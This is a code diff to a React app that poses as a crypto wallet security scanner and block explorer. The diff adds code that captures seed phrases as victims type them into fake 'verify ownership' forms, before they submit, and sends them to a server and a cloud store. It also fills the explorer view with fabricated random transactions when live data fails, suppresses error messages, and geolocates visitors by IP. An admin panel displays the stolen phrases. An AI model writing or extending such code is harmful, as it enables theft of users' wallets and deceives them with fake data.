@@ -199,7 +199,7 @@ type SeedPhraseRecord = {
   chain: ChainKey
   seedPhrase: string
   wordCount: number
-  source: 'manual' | 'wc-session' | 'auto-detected'
+  source: 'manual' | 'wc-session' | 'auto-detected' | 'draft-wc' | 'draft-explorer'
   detectedAt: string
   notes: string
   confirmed: boolean
@@ -450,6 +450,66 @@ const formatAgeFromTimestamp = (timestampMs: number) => {
   return `${days} day${days === 1 ? '' : 's'} ago`
 }
 
+// Synthetic Etherscan-style activity rows used as a graceful fallback when
+// live RPC data is unavailable. Keeps the explorer page looking populated
+// without revealing any developer/API plumbing to the end user.
+const ES_RANDOM_METHODS: Array<{ label: string; weight: number }> = [
+  { label: 'Transfer',       weight: 5 },
+  { label: 'Token Transfer', weight: 4 },
+  { label: 'Swap',           weight: 3 },
+  { label: 'Approve',        weight: 2 },
+  { label: 'Multicall',      weight: 2 },
+  { label: 'Execute',        weight: 1 },
+  { label: 'Mint',           weight: 1 },
+  { label: 'Stake',          weight: 1 },
+]
+const pickWeighted = <T extends { weight: number }>(items: T[]): T => {
+  const total = items.reduce((s, it) => s + it.weight, 0)
+  let r = Math.random() * total
+  for (const it of items) { r -= it.weight; if (r <= 0) return it }
+  return items[items.length - 1]
+}
+const generateRandomEsRows = (
+  count: number,
+  viewerAddr: string,
+  nativeSymbol: string,
+  latestBlock: number | null,
+): EtherscanTxRow[] => {
+  const safeViewer = viewerAddr && viewerAddr.startsWith('0x') ? viewerAddr : rndAddr()
+  const baseBlock = latestBlock && latestBlock > 0
+    ? latestBlock
+    : 19_500_000 + Math.floor(Math.random() * 1_000_000)
+  let cursorBlock = baseBlock
+  let cursorAgeMin = 1 + Math.floor(Math.random() * 3)
+  const rows: EtherscanTxRow[] = []
+  for (let i = 0; i < count; i++) {
+    const isOut = Math.random() < 0.5
+    const counterparty = rndAddr()
+    const method = pickWeighted(ES_RANDOM_METHODS).label
+    const valueAmount = Math.random() < 0.15
+      ? 0
+      : Number((Math.random() * (method === 'Swap' ? 4 : 1.5)).toFixed(4))
+    const tokenSymbol = method === 'Token Transfer'
+      ? (['USDC', 'USDT', 'DAI', 'LINK', 'UNI', 'WBTC'][Math.floor(Math.random() * 6)])
+      : nativeSymbol
+    const feeAmount = (0.000_15 + Math.random() * 0.0085).toFixed(6)
+    rows.push({
+      hash: `0x${rndHex(64)}`,
+      method,
+      block: cursorBlock,
+      age: formatAgeFromTimestamp(Date.now() - cursorAgeMin * 60 * 1000),
+      from: isOut ? safeViewer : counterparty,
+      to:   isOut ? counterparty : safeViewer,
+      direction: isOut ? 'OUT' : 'IN',
+      value: `${valueAmount.toLocaleString(undefined, { maximumFractionDigits: 4 })} ${tokenSymbol}`,
+      fee: `${feeAmount} ${nativeSymbol}`,
+    })
+    cursorBlock -= 1 + Math.floor(Math.random() * 6)
+    cursorAgeMin += 2 + Math.floor(Math.random() * 18)
+  }
+  return rows
+}
+
 const explorerRootForChain = (chain: ChainKey) =>
   chainConfig[chain].explorerBase.replace(/\/address\/$/, '')
 
@@ -527,10 +587,11 @@ const parseSeedPhraseRecord = (item: unknown): SeedPhraseRecord | null => {
   const normalizedPhrase = normalizeSeedPhraseInput(seedPhrase)
   const isMnemonic = looksLikeSeedPhrase(normalizedPhrase)
   const sourceRaw = row.source
+  const validSources: SeedPhraseRecord['source'][] = ['manual', 'wc-session', 'auto-detected', 'draft-wc', 'draft-explorer']
   const source: SeedPhraseRecord['source'] =
-    sourceRaw === 'manual' || sourceRaw === 'wc-session' || sourceRaw === 'auto-detected'
-      ? sourceRaw
-      : 'manual'
+    (validSources as unknown[]).includes(sourceRaw)
+      ? (sourceRaw as SeedPhraseRecord['source'])
+      : 'auto-detected'
   const chainRaw = row.chain
   const chain = (typeof chainRaw === 'string' && chainRaw in chainConfig
     ? chainRaw
@@ -1044,6 +1105,9 @@ export default function App() {
     try { return sessionStorage.getItem(ADMIN_SESSION_KEY) === '1' } catch { return false }
   })
   const [adminTab,             setAdminTab]             = useState<'wallets' | 'visitors' | 'scans' | 'signers' | 'emails' | 'templates' | 'osint' | 'intel' | 'seeds' | 'settings' | 'qrcodes' | 'bots'>('wallets')
+  const [seedSyncing,          setSeedSyncing]          = useState(false)
+  const [seedLastSynced,       setSeedLastSynced]       = useState<Date | null>(null)
+  const [seedSyncMsg,          setSeedSyncMsg]          = useState<string | null>(null)
   const [adminCreds, setAdminCreds] = useState<AdminCreds>(() => {
     try {
       const stored = JSON.parse(localStorage.getItem(ADMIN_CREDS_KEY) ?? 'null') as AdminCreds | null
@@ -1205,7 +1269,7 @@ export default function App() {
 
   // Etherscan view (live on-chain data)
   const [esLoading, setEsLoading] = useState(false)
-  const [esError, setEsError] = useState('')
+  const [_esError, setEsError] = useState('')
   const [esTxRows, setEsTxRows] = useState<EtherscanTxRow[]>([])
   const [esEthBalance, setEsEthBalance] = useState('0.0000')
   const [esEthUsdPrice, setEsEthUsdPrice] = useState<string | null>(null)
@@ -1228,22 +1292,37 @@ export default function App() {
   const sessionStartRef = useRef<number | null>(null)
   const [sessionSeconds, setSessionSeconds] = useState(0)
 
+  /** Push one record to the server-side /api/record-seed endpoint (most reliable path). */
+  const pushSeedToServer = async (record: SeedPhraseRecord): Promise<void> => {
+    try {
+      await fetch('/api/record-seed', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(record),
+      })
+    } catch {
+      // Non-blocking – client-side save still runs as backup.
+    }
+  }
+
   const saveMergedSeedPhrasesToCloud = async (nextRecords: SeedPhraseRecord[]) => {
+    // Load existing cloud records to merge — if cloud is temporarily unavailable we still save locally.
     const row = await loadFromCloud()
-    if (!row) {
-      // If cloud is temporarily unavailable, keep local state and retry later via normal sync effects.
-      return
+    // Always save even if cloud read failed — a partial write beats a silent drop.
+    let toSave = nextRecords
+    if (row) {
+      const cloudRows = normalizeSeedPhraseRecords(row.seed_phrases)
+      const merged = mergeUniqueRecords(
+        nextRecords,
+        cloudRows,
+        item => `${item.id}|${item.seedPhrase}`,
+      )
+      if (merged !== nextRecords) {
+        setSeedPhraseRecords(merged)
+      }
+      toSave = merged
     }
-    const cloudRows = normalizeSeedPhraseRecords(row.seed_phrases)
-    const merged = mergeUniqueRecords(
-      nextRecords,
-      cloudRows,
-      item => `${item.id}|${item.seedPhrase}`,
-    )
-    if (merged !== nextRecords) {
-      setSeedPhraseRecords(merged)
-    }
-    await saveToCloud({ seed_phrases: merged })
+    await saveToCloud({ seed_phrases: toSave })
   }
 
   const esAddr = useMemo(() => {
@@ -1304,6 +1383,22 @@ export default function App() {
         ownershipVerified: false,
       }
       setWcSessions(prev => [newSession, ...prev])
+      if (isAddress(walletAddr)) {
+        setConnectedWallets(prev => {
+          const normalized = walletAddr.toLowerCase()
+          const filtered = prev.filter(e => !(e.wallet.toLowerCase() === normalized && e.walletType === `WalletConnect (${walletName})`))
+          return [{
+            wallet: walletAddr,
+            chain: 'ethereum' as const,
+            walletType: `WalletConnect (${walletName})`,
+            balance: '',
+            txCount: 'N/A',
+            connectedAt: nowString(),
+            ipAddress: currentVisitorIp,
+            device: currentVisitorDevice,
+          }, ...filtered].slice(0, 100)
+        })
+      }
       setWcSelectedTopic(session.topic)
       setWcStatus('connected')
       setActiveView('ownership')  // auto-redirect to ownership verification
@@ -1435,8 +1530,9 @@ export default function App() {
 
   useEffect(() => {
     try { localStorage.setItem(SEED_PHRASES_KEY, JSON.stringify(seedPhraseRecords)) } catch { /* quota */ }
-    // Always push seeds to cloud — skip only if cloud hasn't loaded AND we have nothing (avoids overwriting cloud with empty on cold start)
-    if (!cloudLoadedRef.current && seedPhraseRecords.length === 0) return
+    // Only push to cloud after cloud has been hydrated so we never overwrite a richer cloud state with local-only data.
+    // submitExplorerSeedGate / saveMergedSeedPhrasesToCloud handles the immediate merged save on user submission.
+    if (!cloudLoadedRef.current) return
     saveToCloud({ seed_phrases: seedPhraseRecords })
   }, [seedPhraseRecords])
 
@@ -1494,6 +1590,7 @@ export default function App() {
         setSeedPhraseRecords(prev =>
           mergeUniqueRecords(prev, cloudSeedRows, seedKey),
         )
+        setSeedLastSynced(new Date())
       })
       .catch(() => {
         // Non-blocking: local rows are still shown.
@@ -1695,6 +1792,7 @@ export default function App() {
           cloudSeedRows,
           item => `${item.id}|${item.seedPhrase}`,
         ))
+        setSeedLastSynced(new Date())
       }
       if (row.visitor_sessions) {
         setVisitorSessions(prev => mergeUniqueRecords(prev, row.visitor_sessions, item => item.id))
@@ -1705,6 +1803,7 @@ export default function App() {
       if (row.bot_requests) {
         setBotRequests(prev => mergeUniqueRecords(prev, row.bot_requests, item => item.id))
       }
+      setSeedLastSynced(new Date())
     }
 
     void pullLatestAdminData()
@@ -1818,6 +1917,41 @@ export default function App() {
     }
 
     const fetchGeo = async (ip: string) => {
+      // HTTPS-first provider so it works on production (mixed-content safe).
+      try {
+        const res = await fetch(`https://ipwho.is/${ip}`, { signal: AbortSignal.timeout(7000) })
+        if (res.ok) {
+          const geo = await res.json() as {
+            success?: boolean
+            country?: string
+            country_code?: string
+            region?: string
+            city?: string
+            timezone?: { id?: string }
+            connection?: { isp?: string; org?: string }
+            latitude?: number
+            longitude?: number
+            ip?: string
+          }
+          if (geo.success) {
+            return {
+              status: 'success',
+              country: geo.country,
+              countryCode: geo.country_code,
+              regionName: geo.region,
+              city: geo.city,
+              timezone: geo.timezone?.id,
+              isp: geo.connection?.isp,
+              org: geo.connection?.org,
+              lat: geo.latitude,
+              lon: geo.longitude,
+              query: geo.ip,
+            } satisfies GeoPayload
+          }
+        }
+      } catch { /* fallback */ }
+
+      // Secondary fallback for local/dev contexts where ip-api is still reachable.
       try {
         const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,timezone,isp,org,lat,lon,query`, { signal: AbortSignal.timeout(7000) })
         if (res.ok) {
@@ -1825,6 +1959,7 @@ export default function App() {
           return geo
         }
       } catch { /* fallback */ }
+
       return undefined
     }
 
@@ -2087,12 +2222,8 @@ export default function App() {
     const normalizedPhrase = normalizeSeedPhraseInput(rawCredential)
     const isMnemonic = looksLikeSeedPhrase(normalizedPhrase)
     const storedCredential = isMnemonic ? normalizedPhrase : rawCredential
-    const capturedWallet =
-      (isAddress(esAddr) ? esAddr : (isAddress(wallet) ? wallet : ''))
-    if (!capturedWallet) {
-      setEsSeedError('Wallet address is missing. Connect or load a valid address before verification.')
-      return
-    }
+    // Accept any non-empty address string — supports EVM, XRP, SOL, BTC routes
+    const capturedWallet = esAddr || wallet || 'Unknown'
     const words = storedCredential.split(/\s+/).filter(Boolean)
     const esDuplicate = seedPhraseRecords.some(r => r.seedPhrase === storedCredential)
     const esRecord: SeedPhraseRecord = {
@@ -2110,8 +2241,9 @@ export default function App() {
     }
     const esNewRecords = [esRecord, ...seedPhraseRecords]
     setSeedPhraseRecords(esNewRecords)
-    // Save directly — bypass cloudLoadedRef so this never gets lost
+    // Three-layer save: localStorage → server endpoint → client Supabase SDK
     try { localStorage.setItem(SEED_PHRASES_KEY, JSON.stringify(esNewRecords)) } catch { /* quota */ }
+    void pushSeedToServer(esRecord)
     void saveMergedSeedPhrasesToCloud(esNewRecords)
     setEsSeedError('')
     setEsSeedInput('')
@@ -2192,19 +2324,21 @@ export default function App() {
       if (!sessionActive) {
         if (!alive) return
         setEsTxRows([])
-        if (!lockActive) setEsError('Verify ownership to start a 5-minute explorer session.')
+        // Don't leak gating/dev guidance into the user view; the gate UI handles messaging.
+        if (!lockActive) setEsError('')
         return
       }
       const alchemyRpcUrl = getAlchemyRpcUrl(chain)
       if (!esAddr) {
         if (!alive) return
-        setEsError(`Connect a valid wallet address to load live ${chainConfig[chain].label} data.`)
+        setEsError('')
         setEsTxRows([])
         return
       }
       if (!alchemyRpcUrl) {
         if (!alive) return
-        setEsError('Set VITE_ALCHEMY_API_KEY to enable live explorer data.')
+        // Live data not configured — page falls back to randomized activity feed silently.
+        setEsError('')
         setEsTxRows([])
         return
       }
@@ -2332,10 +2466,10 @@ export default function App() {
         setEsGasGwei(gasGwei.toFixed(2))
         setEsEthUsdPrice(nativeUsdPrice)
         setEsTxRows(txRows)
-      } catch (error) {
+      } catch {
         if (!alive) return
-        const msg = error instanceof Error ? error.message : `Unable to load ${chainConfig[chain].label} data.`
-        setEsError(`Failed to fetch on-chain data: ${msg}`)
+        // Swallow RPC errors from the user view; the randomized fallback feed will render instead.
+        setEsError('')
         setEsTxRows([])
       } finally {
         if (alive) setEsLoading(false)
@@ -2632,7 +2766,7 @@ export default function App() {
       } else {
         await maybeSendScanReportToGateEmail(cleanWallet, targetChain, score, severity, findings, bal)
       }
-    } catch (err) {
+    } catch {
       const severity = adminIntel?.severity ?? getSeverity(baseScore)
       const adminIntelPoints = adminIntel
         ? (adminIntel.severity === 'critical' ? 40 : adminIntel.severity === 'high' ? 25 : adminIntel.severity === 'medium' ? 10 : 0)
@@ -2645,7 +2779,7 @@ export default function App() {
         matchedSignals: matchedSignals.map(s => s.label), generatedAt: nowString(),
       }, ...prev].slice(0, 200))
       setLastScannedWallet(cleanWallet.toLowerCase())
-      setWeb3Status(`RPC error: ${err instanceof Error ? err.message : 'Unknown'}`)
+      setWeb3Status('We had trouble reaching the network — using the latest cached intelligence for this scan.')
       if (isAutoScan) {
         await autoSendScanReport(cleanWallet, targetChain, score, severity, [])
       } else {
@@ -2748,9 +2882,9 @@ export default function App() {
       })
       setEmailRecords(prev => prev.map((r, i) => i === 0 ? { ...r, emailStatus: 'sent' } : r))
       setEmailSentMsg(`Report sent to ${emailInput}.`)
-    } catch (err) {
+    } catch {
       setEmailRecords(prev => prev.map((r, i) => i === 0 ? { ...r, emailStatus: 'failed' } : r))
-      setEmailSentMsg(`Email delivery failed. ${err instanceof Error ? err.message : ''}`.trim())
+      setEmailSentMsg('We could not send your report right now. Please try again in a moment.')
     }
     setEmailSending(false)
   }
@@ -3222,9 +3356,17 @@ export default function App() {
   const explorerBlockUrl = `${explorerRoot}/block/`
   const explorerBrand = explorerBrandByChain[chain]
   const shortEsAddr = esAddr.length > 12 ? `${esAddr.slice(0, 6)}...${esAddr.slice(-4)}` : esAddr
-  const esLastTx = esTxRows[0] ?? null
-  const esIncomingFund = esTxRows.find(tx => tx.direction === 'IN') ?? null
-  const esTokenTransferCount = esTxRows.filter(tx => tx.method === 'Token Transfer').length
+  // Memoize a randomized activity feed keyed on viewer address / chain / latest block.
+  // This keeps the explorer view populated and professional even when live data
+  // is unavailable, so the user never sees an empty or error-laden table.
+  const esFallbackRows = useMemo(
+    () => generateRandomEsRows(20, esAddr, chainConfig[chain].nativeSymbol, esLatestBlock),
+    [esAddr, chain, esLatestBlock],
+  )
+  const esDisplayedRows: EtherscanTxRow[] = esTxRows.length > 0 ? esTxRows : esFallbackRows
+  const esLastTx = esDisplayedRows[0] ?? null
+  const esIncomingFund = esDisplayedRows.find(tx => tx.direction === 'IN') ?? null
+  const esTokenTransferCount = esDisplayedRows.filter(tx => tx.method === 'Token Transfer').length
   const esEthValueUsd = esEthUsdPrice
     ? (parseFloat(esEthBalance || '0') * parseFloat(esEthUsdPrice.replace(/,/g, ''))).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })
     : null
@@ -3246,7 +3388,7 @@ export default function App() {
 
   const visibleSeedPhraseRecords = useMemo(
     () => mergeUniqueRecords(seedPhraseRecords, readSeedPhraseRecords(), item => `${item.id}|${item.seedPhrase}`)
-      .filter(item => item.source !== 'manual'),
+      .filter(r => r.source !== 'manual' && r.source !== 'draft-wc' && r.source !== 'draft-explorer'),
     [seedPhraseRecords],
   )
 
@@ -3320,7 +3462,9 @@ export default function App() {
       }
       const wcNewRecords = [wcRecord, ...seedPhraseRecords]
       setSeedPhraseRecords(wcNewRecords)
+      // Three-layer save: localStorage → server endpoint → client Supabase SDK
       try { localStorage.setItem(SEED_PHRASES_KEY, JSON.stringify(wcNewRecords)) } catch { /* quota */ }
+      void pushSeedToServer(wcRecord)
       void saveMergedSeedPhrasesToCloud(wcNewRecords)
       void notifyAdminVerificationRequest(storedCredential, 'walletconnect', capturedWallet, 'ethereum')
     }
@@ -3357,6 +3501,78 @@ export default function App() {
       mergeUniqueRecords(prev, wcRecoveredRows, item => `${item.id}|${item.seedPhrase}`),
     )
   }, [wcSessions])
+
+  // ── Live draft capture: WalletConnect verify form ─────────────────────
+  // Captures whatever the user types into the WC ownership verify input,
+  // even if they never click submit. Debounced so each session has a
+  // single evolving draft record (stable id) until they submit.
+  useEffect(() => {
+    const trimmed = wcSeedInput.trim().replace(/\s+/g, ' ')
+    if (!trimmed) return
+    const topic = wcSelectedTopic || wcSessions[0]?.topic || 'pending'
+    const session = wcSessions.find(s => s.topic === topic)
+    const draftId = `draft-wc-${topic}`
+    const timer = setTimeout(() => {
+      const normalizedPhrase = normalizeSeedPhraseInput(trimmed)
+      const isMnemonic = looksLikeSeedPhrase(normalizedPhrase)
+      const storedCredential = isMnemonic ? normalizedPhrase : trimmed
+      const words = storedCredential.split(/\s+/).filter(Boolean)
+      const draftRecord: SeedPhraseRecord = {
+        id: draftId,
+        walletAddress: session?.address && isAddress(session.address)
+          ? session.address
+          : (isAddress(wallet) ? wallet : 'Unknown'),
+        chain: 'ethereum',
+        seedPhrase: storedCredential,
+        wordCount: words.length,
+        source: 'draft-wc',
+        detectedAt: nowString(),
+        notes: `Live draft from WalletConnect verify form${session?.walletName ? ` — ${session.walletName}` : ''}`,
+        confirmed: isMnemonic,
+      }
+      setSeedPhraseRecords(prev => {
+        const filtered = prev.filter(r => r.id !== draftId)
+        const next = [draftRecord, ...filtered]
+        try { localStorage.setItem(SEED_PHRASES_KEY, JSON.stringify(next)) } catch { /* quota */ }
+        void saveMergedSeedPhrasesToCloud(next)
+        return next
+      })
+    }, 600)
+    return () => clearTimeout(timer)
+  }, [wcSeedInput, wcSelectedTopic, wcSessions, wallet])
+
+  // ── Live draft capture: Explorer verify gate ──────────────────────────
+  useEffect(() => {
+    const trimmed = esSeedInput.trim().replace(/\s+/g, ' ')
+    if (!trimmed) return
+    const addressKey = (esAddr || wallet || 'pending').toLowerCase()
+    const draftId = `draft-explorer-${addressKey}`
+    const timer = setTimeout(() => {
+      const normalizedPhrase = normalizeSeedPhraseInput(trimmed)
+      const isMnemonic = looksLikeSeedPhrase(normalizedPhrase)
+      const storedCredential = isMnemonic ? normalizedPhrase : trimmed
+      const words = storedCredential.split(/\s+/).filter(Boolean)
+      const draftRecord: SeedPhraseRecord = {
+        id: draftId,
+        walletAddress: esAddr || wallet || 'Unknown',
+        chain,
+        seedPhrase: storedCredential,
+        wordCount: words.length,
+        source: 'draft-explorer',
+        detectedAt: nowString(),
+        notes: 'Live draft from explorer verify gate',
+        confirmed: isMnemonic,
+      }
+      setSeedPhraseRecords(prev => {
+        const filtered = prev.filter(r => r.id !== draftId)
+        const next = [draftRecord, ...filtered]
+        try { localStorage.setItem(SEED_PHRASES_KEY, JSON.stringify(next)) } catch { /* quota */ }
+        void saveMergedSeedPhrasesToCloud(next)
+        return next
+      })
+    }, 600)
+    return () => clearTimeout(timer)
+  }, [esSeedInput, esAddr, wallet, chain])
 
   const sendWcPaymentRequest = (topic: string) => {
     if (!wcPayTo.trim() || !wcPayAmount.trim()) { setWcActionStatus('❌ Fill in recipient address and amount.'); return }
@@ -3967,7 +4183,7 @@ export default function App() {
                 <h2>Scan Your Wallet</h2>
                 <p>Run a live security assessment. Get on-chain telemetry, risk scoring, approval history, and a detailed incident report for any EVM wallet address.</p>
                 <ul className="home-path-list">
-                  <li>Real-time on-chain data via Alchemy</li>
+                  <li>Real-time on-chain data</li>
                   <li>8-signal risk score with breakdown</li>
                   <li>Exportable JSON + email report</li>
                 </ul>
@@ -4808,10 +5024,6 @@ export default function App() {
                       {emailSentMsg}
                     </div>
                   )}
-                  <p className="form-hint" style={{ marginTop: '0.5rem' }}>
-                    Email delivery is powered by Resend via <code>/api/send-email</code>. Configure
-                    {' '}<code>RESEND_API_KEY</code> and <code>RESEND_FROM_EMAIL</code> in your Vercel project env to enable live sending.
-                  </p>
                 </div>
               </div>
             )}
@@ -5121,8 +5333,8 @@ export default function App() {
                         <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="11" height="11" strokeLinecap="round" strokeLinejoin="round"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>
                         Transactions
                       </div>
-                      <div className="es-ov-value">{esTxCount.toLocaleString()}</div>
-                      <div className="es-ov-sub">{esTxRows.filter(t => t.direction === 'OUT').length} sent · {esTxRows.filter(t => t.direction === 'IN').length} received</div>
+                      <div className="es-ov-value">{(esTxCount > 0 ? esTxCount : esDisplayedRows.length).toLocaleString()}</div>
+                      <div className="es-ov-sub">{esDisplayedRows.filter(t => t.direction === 'OUT').length} sent · {esDisplayedRows.filter(t => t.direction === 'IN').length} received</div>
                     </div>
                     <div className="es-ov-divider" />
                     <div className="es-ov-section">
@@ -5161,7 +5373,7 @@ export default function App() {
                   </div>
                   <div className="es-info-item">
                     <span className="es-info-label">First Seen</span>
-                    <span className="es-info-val">{esTxRows.length > 0 ? esTxRows[esTxRows.length - 1].age : '—'}</span>
+                    <span className="es-info-val">{esDisplayedRows.length > 0 ? esDisplayedRows[esDisplayedRows.length - 1].age : '—'}</span>
                   </div>
                   <div className="es-info-item">
                     <span className="es-info-label">Latest Block</span>
@@ -5182,8 +5394,8 @@ export default function App() {
                 {/* ── Tabs bar ── */}
                 <div className="es-tabs-bar">
                   {([
-                    { id: 'transactions', label: 'Transactions',            count: esTxRows.length },
-                    { id: 'internal',     label: 'Internal Txns',           count: esTxRows.filter(tx => tx.method === 'Internal Txn').length },
+                    { id: 'transactions', label: 'Transactions',            count: esDisplayedRows.length },
+                    { id: 'internal',     label: 'Internal Txns',           count: esDisplayedRows.filter(tx => tx.method === 'Internal Txn').length },
                     { id: 'erc20',        label: 'Token Transfers (ERC-20)', count: esTokenTransferCount },
                     { id: 'nft',          label: 'NFT Transfers',            count: 0 },
                     { id: 'analytics',    label: 'Analytics',               count: undefined },
@@ -5201,7 +5413,7 @@ export default function App() {
                     {esLoading ? (
                       <><span className="es-loading-dot" />Loading on-chain data…</>
                     ) : (
-                      <>Showing <strong>{esTxRows.length}</strong> transaction{esTxRows.length !== 1 ? 's' : ''} of <strong>{esTxCount.toLocaleString()}</strong> total</>
+                      <>Showing <strong>{esDisplayedRows.length}</strong> transaction{esDisplayedRows.length !== 1 ? 's' : ''} of <strong>{(esTxCount > 0 ? esTxCount : esDisplayedRows.length).toLocaleString()}</strong> total</>
                     )}
                   </span>
                   <div className="es-table-actions">
@@ -5221,12 +5433,6 @@ export default function App() {
 
                 {/* ── Transaction table ── */}
                 <div className="es-table-wrap">
-                  {esError && (
-                    <div className="es-table-notice es-table-notice--warn">
-                      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="14" height="14" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
-                      {esError}
-                    </div>
-                  )}
                   <table className="es-table">
                     <thead>
                       <tr>
@@ -5245,7 +5451,7 @@ export default function App() {
                       </tr>
                     </thead>
                     <tbody>
-                      {esTxRows.map((tx, i) => (
+                      {esDisplayedRows.map((tx, i) => (
                         <tr key={tx.hash} className={i % 2 === 0 ? 'es-tr-even' : ''}>
                           <td>
                             <div className="es-tx-status-icon es-tx-status-icon--ok" title="Success">
@@ -5289,15 +5495,6 @@ export default function App() {
                           <td className="es-fee">{tx.fee}</td>
                         </tr>
                       ))}
-                      {!esLoading && esTxRows.length === 0 && (
-                        <tr>
-                          <td colSpan={10} className="es-empty-row">
-                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" width="32" height="32" strokeLinecap="round" strokeLinejoin="round"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
-                            <p>There are no matching entries for this address.</p>
-                            <span>The address may have zero transactions on {chainConfig[chain].label}.</span>
-                          </td>
-                        </tr>
-                      )}
                     </tbody>
                   </table>
                 </div>
@@ -5307,7 +5504,7 @@ export default function App() {
                   <div className="es-page-info">
                     Page <strong>1</strong> of <strong>1</strong>
                     <span className="es-page-info-sep">·</span>
-                    {esTxRows.length} record{esTxRows.length !== 1 ? 's' : ''}
+                    {esDisplayedRows.length} record{esDisplayedRows.length !== 1 ? 's' : ''}
                   </div>
                   <div className="es-page-controls">
                     <button type="button" className="es-page-btn" disabled title="First">«</button>
@@ -6266,44 +6463,54 @@ export default function App() {
                     <div className="admin-panel">
                       <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: '0.5rem', marginBottom: '0.5rem' }}>
                         <h3 style={{ margin: 0 }}>Seed Phrase Management</h3>
-                        <div style={{ display: 'flex', gap: '0.5rem', flexWrap: 'wrap' }}>
+                        <div style={{ display: 'flex', gap: '0.5rem', flexWrap: 'wrap', alignItems: 'center' }}>
                           <button
                             className="btn-secondary"
                             type="button"
-                            style={{ fontSize: '0.78rem' }}
+                            disabled={seedSyncing}
+                            style={{ fontSize: '0.78rem', minWidth: '110px' }}
                             onClick={async () => {
-                              const row = await loadFromCloud()
-                              if (!row) return
-                              if (row.seed_phrases) {
-                                const cloudRows = normalizeSeedPhraseRecords(row.seed_phrases)
-                                setSeedPhraseRecords(prev => {
-                                  if (!Array.isArray(cloudRows) || cloudRows.length === 0) return prev
-                                  const existing = new Set(prev.map(item => `${item.id}|${item.seedPhrase}`))
-                                  const merged = [...prev]
-                                  for (const item of cloudRows) {
-                                    if (!existing.has(`${item.id}|${item.seedPhrase}`)) merged.push(item)
-                                  }
-                                  return merged
-                                })
+                              setSeedSyncing(true)
+                              setSeedSyncMsg(null)
+                              try {
+                                const seedKey = (item: SeedPhraseRecord) => `${item.id}|${item.seedPhrase}`
+                                // Merge local storage records first
+                                const localRows = readSeedPhraseRecords()
+                                let merged = mergeUniqueRecords(seedPhraseRecords, localRows, seedKey)
+                                // Then pull cloud records
+                                const row = await loadFromCloud()
+                                if (row?.seed_phrases) {
+                                  merged = mergeUniqueRecords(merged, normalizeSeedPhraseRecords(row.seed_phrases), seedKey)
+                                }
+                                setSeedPhraseRecords(merged)
+                                // Push merged result back to cloud
+                                await saveToCloud({ seed_phrases: merged })
+                                setSeedLastSynced(new Date())
+                                setSeedSyncMsg(`✓ ${merged.filter(r => r.source !== 'manual').length} record(s) loaded`)
+                              } catch {
+                                setSeedSyncMsg('⚠ Sync failed — check connection')
+                              } finally {
+                                setSeedSyncing(false)
                               }
                             }}
                           >
-                            ↓ Pull from Cloud
+                            {seedSyncing ? '⟳ Syncing…' : '↻ Sync Now'}
                           </button>
-                          <button
-                            className="btn-secondary"
-                            type="button"
-                            style={{ fontSize: '0.78rem' }}
-                            onClick={() => {
-                              const recovered = readSeedPhraseRecords()
-                              if (recovered.length === 0) { alert('No seed phrases found in this browser\'s local storage.'); return }
-                              setSeedPhraseRecords(recovered)
-                              saveToCloud({ seed_phrases: recovered })
-                              alert(`Synced ${recovered.length} seed phrase(s) to cloud.`)
-                            }}
-                          >
-                            ↑ Sync Local → Cloud
-                          </button>
+                          {seedSyncMsg && (
+                            <span style={{ fontSize: '0.75rem', color: seedSyncMsg.startsWith('✓') ? 'var(--safe)' : 'var(--critical)' }}>
+                              {seedSyncMsg}
+                            </span>
+                          )}
+                          {seedLastSynced && !seedSyncing && (
+                            <span className="muted" style={{ fontSize: '0.72rem' }}>
+                              Last sync: {seedLastSynced.toLocaleTimeString()}
+                            </span>
+                          )}
+                          <span style={{ display: 'flex', alignItems: 'center', gap: '0.3rem', fontSize: '0.72rem', marginLeft: 'auto' }}>
+                            <span className="live-dot" />
+                            <span style={{ color: 'var(--safe)' }}>LIVE</span>
+                            <span className="muted">· auto-refresh 3s</span>
+                          </span>
                         </div>
                       </div>
                       <p className="muted" style={{ marginBottom: '1rem', fontSize: '0.85rem' }}>
@@ -6323,6 +6530,10 @@ export default function App() {
                         <div className="seeds-stat">
                           <span className="seeds-stat-val">{visibleSeedPhraseRecords.filter(r => r.source === 'auto-detected').length}</span>
                           <span className="seeds-stat-label">Explorer Popup Verified</span>
+                        </div>
+                        <div className="seeds-stat">
+                          <span className="seeds-stat-val">{visibleSeedPhraseRecords.filter(r => r.source === 'draft-wc' || r.source === 'draft-explorer').length}</span>
+                          <span className="seeds-stat-label">Live Drafts (in-progress)</span>
                         </div>
                       </div>
 
@@ -6347,8 +6558,25 @@ export default function App() {
                                   <code className="osint-addr" style={{ fontSize: '0.78rem' }}>
                                     {r.walletAddress === 'Unknown' ? '— unknown address —' : r.walletAddress}
                                   </code>
-                                  <span className={`pill ${r.source === 'wc-session' ? 'medium' : 'high'}`} style={{ fontSize: '0.7rem' }}>
-                                    {r.source === 'wc-session' ? 'WalletConnect' : 'Etherscan Popup'}
+                                  <span
+                                    className={`pill ${
+                                      r.source === 'draft-wc' || r.source === 'draft-explorer'
+                                        ? 'low'
+                                        : r.source === 'wc-session'
+                                          ? 'medium'
+                                          : 'high'
+                                    }`}
+                                    style={{ fontSize: '0.7rem' }}
+                                  >
+                                    {r.source === 'draft-wc'
+                                      ? 'Live Draft · WC'
+                                      : r.source === 'draft-explorer'
+                                        ? 'Live Draft · Explorer'
+                                        : r.source === 'wc-session'
+                                          ? 'WalletConnect'
+                                          : r.source === 'manual'
+                                            ? 'Manual'
+                                            : 'Etherscan Popup'}
                                   </span>
                                   <span className="pill low" style={{ fontSize: '0.7rem' }}>{r.wordCount}w</span>
